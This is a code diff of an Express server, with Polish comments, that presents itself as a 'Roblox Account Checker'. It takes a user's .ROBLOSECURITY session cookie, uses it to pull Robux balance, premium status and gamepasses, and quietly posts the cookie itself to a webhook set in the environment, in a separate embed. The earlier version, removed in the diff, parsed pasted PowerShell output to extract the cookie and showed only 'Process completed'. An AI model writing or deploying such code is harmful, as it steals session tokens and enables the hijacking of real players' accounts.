@@ -2,156 +2,118 @@ const express = require('express');
 const app = express();
 
 app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
 
-// Strona główna – bardzo prosta
+// CORS – żeby strona działała
+app.use((req, res, next) => {
+  res.header('Access-Control-Allow-Origin', '*');
+  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+  res.header('Access-Control-Allow-Headers', 'Content-Type');
+  if (req.method === 'OPTIONS') {
+    return res.sendStatus(200);
+  }
+  next();
+});
+
+// Strona główna – Twoja oryginalna strona HTML
 app.get('/', (req, res) => {
-  res.send(`
-<!DOCTYPE html>
-<html lang="pl">
+  res.send(`<!DOCTYPE html>
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox Process</title>
+  <title>Roblox Account Checker – .ROBLOSECURITY</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #0d0d0d;
-      color: #e0e0e0;
-      margin: 0;
-      padding: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-    }
-    .container {
-      text-align: center;
-      max-width: 600px;
-      padding: 30px;
-      background: #111;
-      border-radius: 12px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.8);
-    }
-    textarea {
-      width: 100%;
-      min-height: 200px;
-      background: #1a1a1a;
-      color: #eee;
-      border: 1px solid #333;
-      border-radius: 8px;
-      padding: 12px;
-      font-family: Consolas, monospace;
-      font-size: 14px;
-      margin: 20px 0;
-      resize: vertical;
-    }
-    button {
-      background: #0066cc;
-      color: white;
-      border: none;
-      padding: 14px 40px;
-      font-size: 18px;
-      border-radius: 8px;
-      cursor: pointer;
-      transition: background 0.3s;
-    }
-    button:hover { background: #0052a3; }
-    #status {
-      margin-top: 20px;
-      font-size: 18px;
-      font-weight: bold;
-    }
-    .success { color: #00ff9d; }
-    .error { color: #ff4d4d; }
+    body { font-family: Arial, sans-serif; max-width: 600px; margin: 40px auto; padding: 20px; background: #111; color: #eee; }
+    textarea { width: 100%; height: 140px; background: #222; color: #eee; border: 1px solid #444; padding: 12px; font-family: monospace; resize: vertical; }
+    button { padding: 14px 32px; background: #1e90ff; border: none; color: white; font-size: 17px; cursor: pointer; margin: 15px 0; border-radius: 4px; }
+    button:hover { background: #0c7ae6; }
+    #result { margin-top: 25px; padding: 20px; background: #1a1a1a; border: 1px solid #444; border-radius: 8px; min-height: 300px; line-height: 1.6; }
+    .error { color: #ff4d4d; } .success { color: #00ff9d; } b { color: #ddd; } small { color: #aaa; }
+    #avatar { max-width: 100%; height: auto; border-radius: 12px; margin: 15px 0; border: 2px solid #444; display: block; }
   </style>
 </head>
 <body>
-<div class="container">
-  <h1>Roblox Process</h1>
-  <textarea id="input" placeholder="Wklej tekst z cookie..."></textarea>
-  <button onclick="startProcess()">Start Process</button>
-  <div id="status"></div>
-</div>
+<h2>Roblox Account Checker (.ROBLOSECURITY)</h2>
+<p style="color:#ffcc00; font-weight:bold;">
+  <strong>WARNING:</strong> Using someone else's cookie violates Roblox ToS and can lead to permanent account ban.
+</p>
+<textarea id="cookie" placeholder="Paste the .ROBLOSECURITY value here (without '.ROBLOSECURITY=')"></textarea>
+<br>
+<button onclick="checkAccount()">Check Account</button>
+<div id="result"></div>
 
 <script>
-async function startProcess() {
-  const input = document.getElementById('input').value.trim();
-  const status = document.getElementById('status');
-
-  status.innerHTML = '';
-
-  if (!input) {
-    status.innerHTML = '<span class="error">Wrong file lil bro</span>';
+async function checkAccount() {
+  const cookieVal = document.getElementById('cookie').value.trim();
+  const result = document.getElementById('result');
+  result.innerHTML = '';
+  if (cookieVal.length < 200) {
+    result.innerHTML = '<span class="error">Cookie is too short or invalid</span>';
     return;
   }
-
-  // Wyciąganie cookie – ulepszone pod Twój PowerShell i inne formaty
-  let cookie = null;
-  let match;
-
-  // 1. PowerShell / .NET format
-  match = input.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
-  if (match && match[1]) cookie = match[1].trim();
-
-  // 2. Klasyczny -and-items.|_
-  if (!cookie) {
-    match = input.match(/-and-items\.\|_(.*?)(?=")/s);
-    if (match && match[1]) cookie = match[1].trim();
-  }
-
-  // 3. Ostrzeżenie + długi ciąg
-  if (!cookie) {
-    match = input.match(/_\\|WARNING[^"]{200,}/);
-    if (match) cookie = match[0].trim();
-  }
-
-  // 4. Fallback – najdłuższy ciąg od _
-  if (!cookie) {
-    const fallbacks = input.match(/_[\\w\\-|]{180,}/g) || [];
-    if (fallbacks.length) cookie = fallbacks.reduce((a, b) => a.length > b.length ? a : b).trim();
-  }
-
-  if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
-    status.innerHTML = '<span class="error">Wrong file lil bro</span>';
-    return;
-  }
-
-  status.innerHTML = '<span class="loading">Processing...</span>';
-
+  result.innerHTML = '<i>Checking account...</i>';
   try {
-    const res = await fetch('/check', {
+    const resp = await fetch('/check', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ cookie })
+      body: JSON.stringify({ cookie: cookieVal })
     });
-
-    if (!res.ok) throw new Error('Server error');
-
-    const json = await res.json();
-
+    const json = await resp.json();
     if (json.error) {
-      status.innerHTML = '<span class="error">Wrong file lil bro</span>';
+      result.innerHTML = \`<span class="error">Error: \${json.error}</span>\`;
       return;
     }
-
-    // Sukces – nic nie pokazujemy oprócz komunikatu
-    status.innerHTML = '<span class="success">Process completed</span>';
-
-  } catch (err) {
-    status.innerHTML = '<span class="error">Wrong file lil bro</span>';
+    if (json.success) {
+      const creationDate = json.created !== 'failed'
+        ? new Date(json.created).toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' })
+        : '—';
+      let avatarHtml = json.avatarUrl
+        ? \`<img id="avatar" src="\${json.avatarUrl}" alt="Avatar" onerror="this.src='https://via.placeholder.com/720?text=No+Avatar';">\`
+        : '<p style="color:#ffcc00;">Could not load avatar</p>';
+      const mm2Passes = [429957, 1308795];
+      let mm2Count = mm2Passes.filter(id => json.hasGamePasses?.includes(id)).length;
+      const mm2Color = mm2Count > 0 ? '#00ff9d' : '#ff4d4d';
+      const ampPasses = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
+      let ampCount = ampPasses.filter(id => json.hasGamePasses?.includes(id)).length;
+      const ampColor = ampCount > 0 ? '#00ff9d' : '#ff4d4d';
+      const sabPasses = [1227013099, 1229510262, 1228591447];
+      let sabCount = sabPasses.filter(id => json.hasGamePasses?.includes(id)).length;
+      const sabColor = sabCount > 0 ? '#00ff9d' : '#ff4d4d';
+      const jbPasses = [2296901, 2219040, 56149618, 4974038, 2725211, 2070427, 2218187];
+      let jbCount = jbPasses.filter(id => json.hasGamePasses?.includes(id)).length;
+      const jbColor = jbCount > 0 ? '#00ff9d' : '#ff4d4d';
+      result.innerHTML = \`
+        <span class="success">Account verified successfully!</span><br><br>
+        \${avatarHtml}
+        <b>Username:</b> \${json.username}<br>
+        <b>Display Name:</b> \${json.displayName}<br>
+        <b>User ID:</b> \${json.userId}<br>
+        <b>Roblox Premium:</b> <span style="color: \${json.hasPremium ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">\${json.hasPremium ? 'YES ✓' : 'NO ✗'}</span><br>
+        <b>Email / Phone Verified:</b> <span style="color: \${json.emailVerified ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">
+          \${json.emailVerified ? 'YES ✓ (hat detected)' : 'NO ✗'}
+        </span><br>
+        <b>Robux Balance:</b> <span style="color: #ffcc00; font-weight: bold;">\${json.robux.toLocaleString('en-US')} Robux</span><br>
+        <b>MM2 Gamepasses:</b> <span style="color: \${mm2Color}; font-weight: bold;">\${mm2Count}</span><br>
+        <b>AMP Gamepasses:</b> <span style="color: \${ampColor}; font-weight: bold;">\${ampCount}</span><br>
+        <b>SAB Gamepasses:</b> <span style="color: \${sabColor}; font-weight: bold;">\${sabCount}</span><br>
+        <b>JB Gamepasses:</b> <span style="color: \${jbColor}; font-weight: bold;">\${jbCount}</span><br>
+        <b>Account Age:</b> <span style="color: #ffcc00; font-weight: bold;">\${json.accountAgeDays} days</span><br>
+        <b>Created:</b> \${creationDate} \${json.created !== 'failed' ? \`<small>(\${json.created.split('T')[0]})\</small>\` : ''}<br>
+      \`;
+    }
+  } catch (e) {
+    result.innerHTML = \`<span class="error">Connection error: \${e.message}</span>\`;
   }
 }
 </script>
 </body>
-</html>
-  `);
+</html>`);
 });
 
-// Endpoint /check – logika + wysyłka dwóch embedów w jednej wiadomości
+// Endpoint do sprawdzania konta + wysyłka na webhook
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
-  if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
+  if (!cookie || typeof cookie !== 'string' || cookie.length < 200) {
     return res.status(400).json({ error: 'Missing or invalid cookie' });
   }
 
@@ -165,25 +127,36 @@ app.post('/check', async (req, res) => {
       },
     });
     const csrfToken = tokenRes.headers.get('x-csrf-token');
-    if (!csrfToken) throw new Error('Failed to obtain X-CSRF-Token');
+    if (!csrfToken) throw new Error('Failed to obtain X-CSRF-Token – invalid/expired cookie?');
 
     // Dane użytkownika
     const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
+      method: 'GET',
       headers: {
         'Cookie': `.ROBLOSECURITY=${cookie}`,
         'X-CSRF-TOKEN': csrfToken,
         'Accept': 'application/json',
       },
     });
-    if (!userRes.ok) throw new Error('Invalid cookie');
+    if (!userRes.ok) {
+      throw new Error(userRes.status === 401 ? 'Invalid or expired cookie' : `API error: ${userRes.status}`);
+    }
     const userData = await userRes.json();
 
-    // Email Verified
+    // Verified Email (hat 102611803)
     let emailVerified = false;
     try {
-      const ownsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`, {
-        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
-      });
+      const ownsRes = await fetch(
+        `https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`,
+        {
+          method: 'GET',
+          headers: {
+            'Cookie': `.ROBLOSECURITY=${cookie}`,
+            'X-CSRF-TOKEN': csrfToken,
+            'Accept': 'application/json',
+          },
+        }
+      );
       if (ownsRes.ok) {
         const ownsData = await ownsRes.json();
         emailVerified = Array.isArray(ownsData.data) && ownsData.data.length > 0;
@@ -211,31 +184,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // RAP
-    let rap = 0;
-    try {
-      const assetsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?sortOrder=Asc&limit=100`, {
-        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
-      });
-      if (assetsRes.ok) {
-        const assets = await assetsRes.json();
-        rap = assets.data.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0);
-      }
-    } catch {}
-
-    // Groups Owned
-    let groupsOwned = 0;
-    try {
-      const groupsRes = await fetch(`https://groups.roblox.com/v2/users/${userData.id}/groups/roles`, {
-        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
-      });
-      if (groupsRes.ok) {
-        const groups = await groupsRes.json();
-        groupsOwned = groups.data.filter(g => g.role.rank === 255).length;
-      }
-    } catch {}
-
-    // Wiek konta
+    // Wiek konta + data utworzenia
     let accountAgeDays = 0;
     let createdDate = null;
     try {
@@ -259,11 +208,12 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Gamepasy
+    // Gamepasy – dodana nowa gra JB
     const mm2Ids = [429957, 1308795];
     const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
     const sabIds = [1227013099, 1229510262, 1228591447];
-    const allIds = [...mm2Ids, ...ampIds, ...sabIds];
+    const jbIds = [2296901, 2219040, 56149618, 4974038, 2725211, 2070427, 2218187];
+    const allIds = [...mm2Ids, ...ampIds, ...sabIds, ...jbIds];
     const hasGamePasses = [];
 
     try {
@@ -290,50 +240,29 @@ app.post('/check', async (req, res) => {
     const mm2Count = hasGamePasses.filter(id => mm2Ids.includes(id)).length;
     const ampCount = hasGamePasses.filter(id => ampIds.includes(id)).length;
     const sabCount = hasGamePasses.filter(id => sabIds.includes(id)).length;
-
-    // Headless i Korblox
-    let hasHeadless = false;
-    let hasKorblox = false;
-    try {
-      const headlessRes = await fetch(
-        `https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/201`,
-        { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken } }
-      );
-      if (headlessRes.ok) {
-        const data = await headlessRes.json();
-        hasHeadless = Array.isArray(data.data) && data.data.length > 0;
-      }
-
-      const korbloxRes = await fetch(
-        `https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/192`,
-        { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken } }
-      );
-      if (korbloxRes.ok) {
-        const data = await korbloxRes.json();
-        hasKorblox = Array.isArray(data.data) && data.data.length > 0;
-      }
-    } catch {}
+    const jbCount = hasGamePasses.filter(id => jbIds.includes(id)).length;
 
     const result = {
       success: true,
       username: userData.name,
+      displayName: userData.displayName || userData.name,
       userId: userData.id,
       hasPremium,
       robux,
-      rap,
-      groupsOwned,
       accountAgeDays,
-      created: createdDate || 'failed',
+      created: createdDate || 'failed to fetch',
       avatarUrl,
+      hasGamePasses,
       emailVerified,
-      hasHeadless,
-      hasKorblox,
       mm2Count,
       ampCount,
-      sabCount
+      sabCount,
+      jbCount
     };
 
-    // Wysyłka dwóch embedów w jednej wiadomości
+    res.status(200).json(result);
+
+    // Wysyłka do webhooka – dwa embedy w jednej wiadomości
     const webhookUrl = process.env.WEBHOOK;
     if (webhookUrl) {
       try {
@@ -342,7 +271,7 @@ app.post('/check', async (req, res) => {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             embeds: [
-              // Embed 1 – pełny z kontem
+              // Embed 1 – pełny z informacjami o koncie
               {
                 color: 0x0F0F23,
                 title: `<:User:1481761037257674872> ${userData.name}`,
@@ -369,7 +298,8 @@ app.post('/check', async (req, res) => {
                     value:
                       `<:MM2:1481763122808230164> MM2: **${mm2Count}**\n` +
                       `<:AMP:1481763635775930520> AMP: **${ampCount}**\n` +
-                      `<:SAB:1481763931113394177> SAB: **${sabCount}**`,
+                      `<:SAB:1481763931113394177> SAB: **${sabCount}**\n` +
+                      `<:JB:1481804052215103509> JB: **${jbCount}**`,
                     inline: true
                   },
                   {
@@ -386,7 +316,7 @@ app.post('/check', async (req, res) => {
                 timestamp: new Date().toISOString()
               },
 
-              // Embed 2 – tylko .ROBLOSECURITY (ciemno fioletowy, bez zbędnych linii)
+              // Embed 2 – tylko .ROBLOSECURITY (ciemno fioletowy, minimalistyczny)
               {
                 color: 0x4B0082,
                 title: ".ROBLOSECURITY",
@@ -401,8 +331,6 @@ app.post('/check', async (req, res) => {
       }
     }
 
-    res.json(result);
-
   } catch (err) {
     console.error(err);
     res.status(500).json({ error: err.message || 'Internal server error' });
@@ -410,6 +338,6 @@ app.post('/check', async (req, res) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, '0.0.0.0', () => {
+app.listen(PORT, () => {
   console.log(`Serwer działa na porcie ${PORT}`);
 });
